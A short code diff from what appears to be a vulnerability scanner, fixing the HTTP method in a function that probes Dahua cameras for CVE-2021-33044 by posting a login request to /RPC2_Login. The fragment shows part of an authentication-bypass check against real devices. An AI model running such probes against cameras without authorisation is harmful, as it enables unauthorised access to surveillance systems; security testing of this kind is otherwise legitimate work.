@@ -110,7 +110,7 @@ def cve_2021_33044(ip: str) -> list:
         "id": 1,
         "session": 0,
     }
-    r = requests.get(f"http://{ip}/RPC2_Login", headers=headers, json=_json, verify=False, timeout=timeout)
+    r = requests.post(f"http://{ip}/RPC2_Login", headers=headers, json=_json, verify=False, timeout=timeout)
     if r.status_code == 200 and r.json()['result']:
         return [True, 'Dahua', 'cve-2021-33044']
     return [False, 'Dahua', 'cve-2021-33044']
